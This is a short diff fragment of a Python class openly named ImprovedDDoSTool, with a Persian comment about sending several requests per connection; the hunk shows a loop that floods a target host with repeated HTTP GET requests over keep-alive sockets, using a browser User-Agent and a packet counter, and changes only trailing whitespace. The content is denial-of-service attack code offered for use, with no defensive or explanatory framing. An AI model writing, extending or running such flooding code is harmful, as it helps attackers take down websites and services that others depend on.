@@ -21,7 +21,7 @@ class ImprovedDDoSTool:
                 # ارسال چندین درخواست در هر اتصال
                 for _ in range(5):
                     http_get = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
-                    sock.send(http_get.encode())
+                    sock.send(http_get.encode())    
                     self.packets_sent += 1
                     time.sleep(0.01)
 
